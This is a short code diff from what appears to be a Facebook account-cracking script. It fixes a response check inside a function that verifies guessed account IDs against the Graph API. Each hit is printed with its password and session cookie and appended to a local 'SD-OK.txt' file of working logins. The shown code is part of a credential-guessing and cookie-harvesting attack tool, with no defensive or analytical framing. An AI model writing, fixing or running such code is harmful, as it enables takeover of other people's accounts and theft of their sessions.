@@ -941,7 +941,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                 xd = xx[:15]
                 res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
                 try:
-                    if "height" in res:
+                    if "height" in res["data"]:
                         print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[🍪][spring_green1]{coki}")
                         open("/sdcard/SD-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
                         oks.append(xd)
